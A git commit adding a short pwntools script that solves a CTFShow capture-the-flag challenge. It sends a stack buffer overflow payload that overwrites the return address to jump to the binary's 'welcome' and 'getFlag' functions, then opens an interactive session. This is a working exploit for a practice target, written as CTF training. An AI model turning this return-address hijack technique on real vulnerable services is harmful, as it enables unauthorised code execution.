350adbe8e1a4440b3af5243b85e2b365a20e7818
谭尧丹 <tanyaodan@qq.com>
2021-10-12 10:37:01 +0800

    Create pwn06.py

---
+++ CTFShow/pwn06.py
@@ -0,0 +1,12 @@
+from pwn import *
+
+io = remote('pwn.challenge.ctf.show', 28194)
+e = ELF('pwn06')
+welcome_address = e.symbols['welcome']
+log.success('welcome_address => %s' % hex(welcome_address).upper())
+getFlag_address = e.symbols['getFlag']
+log.success('getFlag_address => %s' % hex(getFlag_address).upper())
+payload = b'a'*0xc + b'fuckpwn!' + p64(welcome_address) + p64(getFlag_address)
+# payload = b'a'*0xc + b'fuckpwn!' + p64(0x40058F) + p64(0x400577)
+io.sendline(payload)
+io.interactive()
